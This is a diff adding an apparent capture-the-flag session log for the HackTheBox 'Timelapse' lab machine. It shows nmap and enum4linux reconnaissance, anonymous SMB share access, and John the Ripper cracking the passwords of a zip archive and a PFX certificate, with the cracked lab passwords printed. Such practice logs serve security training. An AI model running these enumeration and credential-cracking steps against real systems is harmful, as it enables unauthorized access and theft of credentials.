@@ -1,0 +1,297 @@
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# nmap -A -p- -Pn -T4 -v 10.10.11.152
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-10 08:23 UTC
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 08:23
+Completed NSE at 08:23, 0.00s elapsed
+Initiating NSE at 08:23
+Completed NSE at 08:23, 0.00s elapsed
+Initiating NSE at 08:23
+Completed NSE at 08:23, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 08:23
+Completed Parallel DNS resolution of 1 host. at 08:23, 0.00s elapsed
+Initiating SYN Stealth Scan at 08:23
+Scanning 10.10.11.152 [65535 ports]
+Discovered open port 135/tcp on 10.10.11.152
+Discovered open port 53/tcp on 10.10.11.152
+Discovered open port 139/tcp on 10.10.11.152
+Discovered open port 445/tcp on 10.10.11.152
+Discovered open port 49673/tcp on 10.10.11.152
+SYN Stealth Scan Timing: About 12.79% done; ETC: 08:27 (0:03:31 remaining)
+Discovered open port 49674/tcp on 10.10.11.152
+Discovered open port 49667/tcp on 10.10.11.152
+Discovered open port 389/tcp on 10.10.11.152
+Discovered open port 49696/tcp on 10.10.11.152
+SYN Stealth Scan Timing: About 36.12% done; ETC: 08:26 (0:01:48 remaining)
+Discovered open port 5986/tcp on 10.10.11.152
+Discovered open port 3269/tcp on 10.10.11.152
+SYN Stealth Scan Timing: About 65.35% done; ETC: 08:25 (0:00:48 remaining)
+Discovered open port 9389/tcp on 10.10.11.152
+Discovered open port 593/tcp on 10.10.11.152
+Discovered open port 65466/tcp on 10.10.11.152
+Discovered open port 88/tcp on 10.10.11.152
+Discovered open port 636/tcp on 10.10.11.152
+Discovered open port 464/tcp on 10.10.11.152
+Discovered open port 3268/tcp on 10.10.11.152
+Completed SYN Stealth Scan at 08:25, 121.43s elapsed (65535 total ports)
+Initiating Service scan at 08:25
+Scanning 18 services on 10.10.11.152
+Completed Service scan at 08:26, 56.01s elapsed (18 services on 1 host)
+Initiating OS detection (try #1) against 10.10.11.152
+Retrying OS detection (try #2) against 10.10.11.152
+Initiating Traceroute at 08:26
+Completed Traceroute at 08:26, 0.16s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 08:26
+Completed Parallel DNS resolution of 2 hosts. at 08:26, 0.00s elapsed
+NSE: Script scanning 10.10.11.152.
+Initiating NSE at 08:26
+Completed NSE at 08:26, 40.09s elapsed
+Initiating NSE at 08:26
+Completed NSE at 08:27, 4.44s elapsed
+Initiating NSE at 08:27
+Completed NSE at 08:27, 0.00s elapsed
+Nmap scan report for 10.10.11.152
+Host is up (0.15s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-07-10 16:25:23Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_ssl-date: 2022-07-10T16:27:00+00:00; +7h59m59s from scanner time.
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Issuer: commonName=dc01.timelapse.htb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-25T14:05:29
+| Not valid after:  2022-10-25T14:25:29
+| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
+|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
+| tls-alpn:
+|_  http/1.1
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49696/tcp open  msrpc             Microsoft Windows RPC
+65466/tcp open  msrpc             Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-07-10T16:26:19
+|_  start_date: N/A
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# enum4linux 10.10.11.152
+WARNING: polenum is not in your path.  Check that package is installed and your PATH is sane.
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 10 09:06:28 2022
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.11.152
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on 10.10.11.152 )============================
+
+
+[E] Can't find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for 10.10.11.152 )================================
+
+Looking up status of 10.10.11.152
+No reply from 10.10.11.152
+
+ ===================================( Session Check on 10.10.11.152 )===================================
+
+
+[+] Server 10.10.11.152 allows sessions using username '', password ''
+
+
+ ================================( Getting domain SID for 10.10.11.152 )================================
+
+Domain Name: TIMELAPSE
+Domain Sid: S-1-5-21-671920749-559770252-3318990721
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ===================================( OS information on 10.10.11.152 )===================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.10.11.152 from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+
+ =======================================( Users on 10.10.11.152 )=======================================
+
+
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ =================================( Share Enumeration on 10.10.11.152 )=================================
+
+smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.11.152]
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Error returning browse list: NT_STATUS_REVISION_MISMATCH
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.11.152
+
+
+ ============================( Password Policy Information for 10.10.11.152 )============================
+
+
+[E] Dependent program "polenum" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
+
+
+
+ =======================================( Groups on 10.10.11.152 )=======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ==================( Users on 10.10.11.152 via RID cycling (RIDS: 500-550,1000-1050) )==================
+
+
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+
+
+ ===============================( Getting printer info for 10.10.11.152 )===============================
+
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sun Jul 10 09:07:19 2022
+
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# smbclient -L //10.10.11.152
+Enter MYGROUP\root's password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Shares          Disk
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# smbclient //10.10.11.152/Shares
+Enter MYGROUP\root's password:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Oct 25 15:39:15 2021
+  ..                                  D        0  Mon Oct 25 15:39:15 2021
+  Dev                                 D        0  Mon Oct 25 19:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021
+
+                6367231 blocks of size 4096. 2467908 blocks available
+smb: \> cd Dev
+smb: \Dev\> ls
+  .                                   D        0  Mon Oct 25 19:40:06 2021
+  ..                                  D        0  Mon Oct 25 19:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021
+
+                6367231 blocks of size 4096. 2467908 blocks available
+smb: \Dev\> cd ..
+smb: \> cd HelpDesk\
+smb: \HelpDesk\> ls
+  .                                   D        0  Mon Oct 25 15:48:42 2021
+  ..                                  D        0  Mon Oct 25 15:48:42 2021
+  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
+  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021
+
+                6367231 blocks of size 4096. 2467908 blocks available
+
+smb: \Dev\> get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/zip2john winrm_backup.zip > hash.txt
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/john hash.txt --wordlist=/root/oscp/tools/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+1g 0:00:00:00 DONE (2022-07-10 09:22) 1.562g/s 5420Kp/s 5420Kc/s 5420KC/s surken201..suppamart
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+unzip winrm_backup.zip
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/pfx2john.py legacyy_dev_auth.pfx > hash_pfx.txt
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# ~/oscp/tools/john/run/john hash_pfx.txt --wordlist=/root/oscp/tools/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)
+1g 0:00:02:22 DONE (2022-07-10 09:29) 0.007033g/s 22727p/s 22727c/s 22727C/s thuglife03282006..thug209
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+TIPS: PFX
+https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
+
+
